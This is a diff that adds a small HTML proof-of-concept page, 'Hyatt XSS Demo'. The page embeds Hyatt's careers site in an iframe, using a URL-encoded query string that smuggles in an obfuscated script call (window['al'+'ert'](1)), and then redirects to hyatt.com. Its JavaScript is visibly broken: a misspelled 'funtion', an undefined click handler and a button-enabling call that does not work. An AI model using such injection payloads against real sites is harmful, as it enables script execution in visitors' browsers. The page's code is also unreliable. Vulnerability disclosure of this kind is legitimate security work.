@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Hyatt XSS Demo</title>
+	</head>
+	<body>
+    Loading...
+		<button id="openhyatt" disabled>Continue to Hyatt.com</button>
+		<script type="text/javascript">
+			let theWindow;
+
+			funtion handleOnload() {
+        document.getElementById( 'openhyatt' ).setAttribute( 'disabled', false );
+        
+        openHyatt();
+      }
+
+			async function openHyatt() {
+				window.location.href = `https://hyatt.com?src=1`
+			}
+
+			document.getElementById( 'openhyatt' ).addEventListener( 'click', theOpener );
+		</script>
+    
+    
+    <iframe src="https://careers.hyatt.com/en-US/careers/?src=%20s_cmkw%3D%5B%5B1%5D%5D%20s_cmch%3Dwindow%5B%22al%22%252B%22ert%22%5D(1)" onload="handleOnload()"></iframe>
+	</body>
+</html>
